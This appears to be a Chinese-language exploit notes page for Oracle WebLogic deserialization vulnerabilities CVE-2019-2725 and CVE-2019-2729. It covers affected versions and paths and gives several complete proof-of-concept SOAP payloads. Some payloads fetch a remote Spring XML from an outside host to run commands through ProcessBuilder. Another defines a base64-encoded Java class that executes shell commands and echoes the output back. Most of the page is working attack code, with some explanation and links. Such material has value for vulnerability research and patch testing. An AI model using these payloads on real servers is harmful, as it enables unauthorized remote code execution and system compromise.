这个类`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`在v10和v12都存在：
- 10.3.6.0: `modules/com.bea.core.repackaged.springframework.spring_1.2.0.0_2-5-3.jar`
- 12.1.3.0: `wlserver/modules/com.bea.core.repackaged.springframework.spring_1.5.0.0_2-5-3.jar`

而且这两个path：
- `/wls-wsat/CoordinatorPortType`
- `/_async/AsyncResponseService`
都可以用。

限制条件在于：服务器能否外联出网

### CVE-2019-2725_v10_12_spring
poc:
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
<java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void>
<string>
http://cqq.com:8888/spel2.xml
</string>
</void>
</class>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```

### CVE-2019-2729_v10_spring
由于jdk的xmldecoder原因，`<array method="forName">`仅支持基于jdk6的v10.

poc:
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
<java>
<array method="forName"><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string>
<void><string>http://cqq.com:8888/spel2.xml</string></void>
</array>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```



其中spel2.xml文件内容：
```xml
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>cmd</value>
        <value>/c</value>
        <value><![CDATA[calc]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```


### CVE-2019-2729_v10_UnitOfWorkChangeSet_jdk7u21

`oracle.toplink.internal.sessions.UnitOfWorkChangeSet`这个类只在v10中。
原理：
>`UnitOfWorkChangeSet`类构造方法中直接调用了JDK原生类中的readObject()方法，并且其构造方法的接收参数恰好是字节数组，这就满足了上一个补丁中array标签的class属性值必须为byte的要求，再借助带index属性的void元素，完成向字节数组中赋值恶意序列化对象的过程，最终利用JDK 7u21反序列化漏洞造成了远程代码执行。通过巧妙的利用了void、array和Class这三个元素成功的打造了利用链。

来源：
- [Weblogic反序列化远程代码执行漏洞（CVE-2019-2725）分析报告](https://mp.weixin.qq.com/s/fPZhWOyPexgQy6f-9c-JSw)

payload生成参考：
- [
WebLogic wls9-async组件RCE分析（CVE-2019-2725）](https://lucifaer.com/2019/05/10/WebLogic%20wls9-async%E7%BB%84%E4%BB%B6RCE%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-2725%EF%BC%89/)


### CVE-2019-2729_v10_UnitOfWorkChangeSet_with_echo

带回显的payload：
来源：
- https://github.com/starnightcyber/VEF/blob/ebbdeed2556d56fd0a59796f72c8643f277a5151/scripts/weblogic-cve-2019-2729.py


### CVE-2019-2725_v12_EventData_double_xml
利用`org.slf4j.ext.EventData`进行二次xml反序列化。`org.slf4j.ext.EventData`只存在于v12中。
poc（加载自定义类）:
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
<java>
<class><string>org.slf4j.ext.EventData</string>
<void>
<string>
		<java>
			<void class="sun.misc.BASE64Decoder">
				<void method="decodeBuffer" id="byte_arr">	<string>yv66vgAAADIAYwoAFAA8CgA9AD4KAD0APwoAQABBBwBCCgAFAEMHAEQKAAcARQgARgoABwBHBwBICgALADwKAAsASQoACwBKCABLCgATAEwHAE0IAE4HAE8HAFABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExSZXN1bHRCYXNlRXhlYzsBAAhleGVjX2NtZAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABcAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAANmaXMBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAZyZXN1bHQBAA1TdGFja01hcFRhYmxlBwBRBwBSBwBTBwBCBwBEAQAKRXhjZXB0aW9ucwEAB2RvX2V4ZWMBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247BwBNBwBUAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAChSZXN1bHRCYXNlRXhlYy5qYXZhIGZyb20gSW5wdXRGaWxlT2JqZWN0DAAVABYHAFUMAFYAVwwAWABZBwBSDABaAFsBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAVAFwBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAVAF0BAAAMAF4AXwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABgAGEMAGIAXwEAC2NtZC5leGUgL2MgDAAcAB0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQALL2Jpbi9zaCAtYyABAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABMAFAAAAAAABAABABUAFgABABcAAAAvAAEAAQAAAAUqtwABsQAAAAIAGAAAAAYAAQAAAAMAGQAAAAwAAQAAAAUAGgAbAAAACQAcAB0AAgAXAAAA+QADAAcAAABOuAACKrYAA0wrtgAETbsABVkstwAGTrsAB1kttwAIOgQBOgUSCToGGQS2AApZOgXGABy7AAtZtwAMGQa2AA0ZBbYADbYADjoGp//fGQawAAAAAwAYAAAAJgAJAAAABgAIAAcADQAIABYACQAgAAoAIwALACcADAAyAA4ASwARABkAAABIAAcAAABOAB4AHwAAAAgARgAgACEAAQANAEEAIgAjAAIAFgA4ACQAJQADACAALgAmACcABAAjACsAKAAfAAUAJwAnACkAHwAGACoAAAAfAAL/ACcABwcAKwcALAcALQcALgcALwcAKwcAKwAAIwAwAAAABAABABEACQAxAB0AAgAXAAAAqgACAAMAAAA3EglMuwALWbcADBIPtgANKrYADbYADrgAEEynABtNuwALWbcADBIStgANKrYADbYADrgAEEwrsAABAAMAGgAdABEAAwAYAAAAGgAGAAAAFgADABkAGgAeAB0AGwAeAB0ANQAfABkAAAAgAAMAHgAXADIAMwACAAAANwAeAB8AAAADADQAKQAfAAEAKgAAABMAAv8AHQACBwArBwArAAEHADQXADAAAAAEAAEANQAJADYANwACABcAAAArAAAAAQAAAAGxAAAAAgAYAAAABgABAAAANgAZAAAADAABAAAAAQA4ADkAAAAwAAAABAABADUAAQA6AAAAAgA7</string>
				</void>
			</void>
			<void class="org.mozilla.classfile.DefiningClassLoader">
				<void method="defineClass">    <!--  调用defineClass方法 ：defineClass(String var1, byte[] var2) -->
					<string>ResultBaseExec</string>    <!--  传入第一个String参数 -->
					<object idref="byte_arr"></object>    <!--  传入第二个byte[]参数 -->
					<void method="newInstance">    <!--  得到的Class对象，再新建其对象 -->
						<void method="do_exec" id="result">    <!--  执行新建对象的do_exec(String)方法 实现RCE-->
							<string>echo windowslu^fei linuxlu$1fei test</string>    <!--  这里主要是为了兼容linux和windows的回显  -->
						</void>
					</void>
				</void>
			</void>
			<void class="java.lang.Thread" method="currentThread">
				<void method="getCurrentWork" id="current_work">
					<void method="getClass">
						<void method="getDeclaredField">
							<string>connectionHandler</string>
								<void method="setAccessible"><boolean>true</boolean></void>
							<void method="get">
								<object idref="current_work"></object>
								<void method="getServletRequest">
									<void method="getResponse">
										<void method="getServletOutputStream">
											<void method="writeStream">
												<object class="weblogic.xml.util.StringInputStream"><object idref="result"></object></object>
												</void>
											<void method="flush"/>
											</void>
									<void method="getWriter"><void method="write"><string></string></void></void>
									</void>
								</void>
							</void>
						</void>
					</void>
				</void>
			</void>
		</java>
</string>
</void>
</class>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```



### CVE-2019-2725_v12_EventData_simple
另外一poc：
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
<java><class><string>org.slf4j.ext.EventData</string><void><string><![CDATA[<java class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index = "0"><string>cmd.exe</string></void><void index = "1"><string>/c</string></void><void index = "2"><string></string></void></array><void method="start" id="process"/></void><object idref="process"><void id="inputStream" method="getInputStream"/></object><object id="scanner" class="java.util.Scanner"><object idref="inputStream"/></object><object idref="scanner"><void method="useDelimiter"><string>\\A</string></void><void id="result" method="next"/></object><void class="java.lang.Thread" method="currentThread"><void method="getCurrentWork" id="current_work"><void method="getClass"><void method="getDeclaredField"><string>connectionHandler</string><void method="setAccessible"><boolean>true</boolean></void><void method="get"><object idref="current_work"></object><void method="getServletRequest"><void method="getResponse"><void method="getServletOutputStream"><void method="writeStream"><object class="weblogic.xml.util.StringInputStream"><object idref="result"></object></object></void><void method="flush"/></void><void method="getWriter"><void method="write"><string></string></void></void></void></void></void></void></void></void></void></java>]]></string></void></class></java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```


参考：
- [Weblogic-CVE-2019-2725分析通杀poc](https://p0rz9.github.io/2019/05/22/Weblogic-CVE-2019-2725%E5%88%86%E6%9E%90%E9%80%9A%E6%9D%80poc/)
- [Weblogic-CVE-2019-2725-通杀payload](http://www.lmxspace.com/2019/05/15/Weblogic-CVE-2019-2725-%E9%80%9A%E6%9D%80payload/)
- [WebLogic wls9-async组件RCE分析（CVE-2019-2725）](https://lucifaer.com/2019/05/10/WebLogic%20wls9-async%E7%BB%84%E4%BB%B6RCE%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-2725%EF%BC%89/)
- [CNTA-2019-0014 wls9-async 反序列化 rce 分析](https://www.cnblogs.com/afanti/p/10792982.html)